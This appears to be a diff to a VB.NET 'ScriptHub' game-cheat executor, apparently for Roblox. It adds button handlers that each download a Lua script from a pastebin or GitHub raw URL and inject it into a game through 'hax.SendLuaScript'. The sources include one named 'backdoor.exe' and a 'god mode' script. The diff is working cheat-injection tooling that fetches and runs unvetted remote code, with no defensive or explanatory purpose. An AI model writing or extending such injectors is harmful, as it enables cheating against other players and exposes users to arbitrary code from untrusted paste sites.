@@ -239,4 +239,113 @@ Public Class ScriptHub
         Dim Script As String = wb.DownloadString("https://pastebin.com/raw/ysnZXcSe")
         hax.SendLuaScript(Script)
     End Sub
+
+    Private Sub Button27_Click(sender As Object, e As EventArgs) Handles Button27.Click
+        Dim wb As WebClient = New WebClient()
+        Dim Script As String = wb.DownloadString("https://pastebin.com/raw/9NQvF8gp")
+        hax.SendLuaScript(Script)
+    End Sub
+
+    Private Sub Button35_Click(sender As Object, e As EventArgs) Handles Button35.Click
+        Dim wb As WebClient = New WebClient()
+        Dim Script As String = wb.DownloadString("https://pastebin.com/raw/9QCyuc2p")
+        hax.SendLuaScript(Script)
+
+
+    End Sub
+
+    Private Sub Button36_Click(sender As Object, e As EventArgs) Handles Button36.Click
+        Dim wb As WebClient = New WebClient()
+        Dim Script As String = wb.DownloadString("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
+        hax.SendLuaScript(Script)
+    End Sub
+
+    Private Sub Button37_Click(sender As Object, e As EventArgs) Handles Button37.Click
+        Dim wb As WebClient = New WebClient()
+        Dim Script As String = wb.DownloadString("https://pastebin.com/raw/XrxpS1vp") 'FUCKING GOD MODE HAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHA
+        hax.SendLuaScript(Script)
+
+
+    End Sub
+
+    Private Sub Button39_Click(sender As Object, e As EventArgs) Handles Button39.Click
+        ' hax.SetWalkSpeed()
+        Dim wb As WebClient = New WebClient()
+        Dim Script As String = wb.DownloadString("https://pastebin.com/raw/puXFd92q")
+        hax.SendLuaScript(Script)
+
+
+    End Sub
+
+    Private Sub Button40_Click(sender As Object, e As EventArgs) Handles Button40.Click
+
+        Dim wb As WebClient = New WebClient()
+        Dim Script As String = wb.DownloadString("https://pastebin.com/raw/7B6rpudb")
+        hax.SendLuaScript(Script)
+
+    End Sub
+
+    Private Sub Button41_Click(sender As Object, e As EventArgs) Handles Button41.Click
+        Dim wb As WebClient = New WebClient()
+        Dim Script As String = wb.DownloadString("https://pastebin.com/raw/tXCeNPpQ")
+        hax.SendLuaScript(Script)
+
+
+    End Sub
+
+    Private Sub Button52_Click(sender As Object, e As EventArgs) Handles Button52.Click
+        Dim wb As WebClient = New WebClient()
+        Dim Script As String = wb.DownloadString("https://pastebin.com/raw/JQQf4PEZ")
+        hax.SendLuaScript(Script)
+    End Sub
+
+    Private Sub Button42_Click(sender As Object, e As EventArgs) Handles Button42.Click
+        Dim wb As WebClient = New WebClient()
+        Dim Script As String = wb.DownloadString("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua")
+        hax.SendLuaScript(Script)
+
+    End Sub
+
+    Private Sub Button43_Click(sender As Object, e As EventArgs) Handles Button43.Click
+        Dim wb As WebClient = New WebClient()
+        Dim Script As String = wb.DownloadString("https://pastebin.com/raw/D6wnPGx8")
+        hax.SendLuaScript(Script)
+
+
+    End Sub
+
+    Private Sub Button51_Click(sender As Object, e As EventArgs) Handles Button51.Click
+        Dim wb As WebClient = New WebClient()
+        Dim Script As String = wb.DownloadString("https://pastebin.com/raw/GPuVHP9H")
+        hax.SendLuaScript(Script)
+
+
+    End Sub
+
+    Private Sub Button50_Click(sender As Object, e As EventArgs) Handles Button50.Click
+        Dim wb As WebClient = New WebClient()
+        Dim Script As String = wb.DownloadString("https://pastebin.com/raw/nWy8JgEM")
+        hax.SendLuaScript(Script)
+    End Sub
+
+    Private Sub Button49_Click(sender As Object, e As EventArgs) Handles Button49.Click
+        Dim wb As WebClient = New WebClient()
+        Dim Script As String = wb.DownloadString("https://pastebin.com/raw/KjvjUML9")
+        hax.SendLuaScript(Script)
+
+
+    End Sub
+
+    Private Sub Button48_Click(sender As Object, e As EventArgs) Handles Button48.Click
+        Dim wb As WebClient = New WebClient()
+        Dim Script As String = wb.DownloadString("https://pastebin.com/raw/shuCFyZZ")
+        hax.SendLuaScript(Script)
+    End Sub
+
+    Private Sub Button47_Click(sender As Object, e As EventArgs) Handles Button47.Click
+        Dim wb As WebClient = New WebClient()
+        Dim Script As String = wb.DownloadString("https://pastebin.com/raw/qen6m4ty")
+        hax.SendLuaScript(Script)
+
+    End Sub
 End Class
